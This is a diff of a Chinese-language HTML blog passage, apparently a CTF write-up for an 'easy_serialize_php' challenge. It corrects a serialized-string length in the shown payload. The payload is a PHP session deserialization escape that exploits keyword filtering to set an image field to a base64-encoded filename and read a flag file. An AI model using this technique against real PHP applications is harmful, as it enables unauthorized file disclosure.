@@ -236,9 +236,9 @@
 <h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</span><br></pre></td></tr></table></figure>
 
 <p>session序列化之后是这样的：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>过滤之后就是把<strong>a</strong>赋值给了**;s:51:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
+<p>过滤之后就是把<strong>a</strong>赋值给了**;s:49:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
 <p>拿到页面内容：<img src="/2022/02/09/easy-serialize-php/3.png" alt="1"></p>
 <p><img src="/2022/02/09/easy-serialize-php/5.png" alt="1"></p>
 <p>我们直接将刚刚读取的文件名替换成这个就可以得到flag了</p>
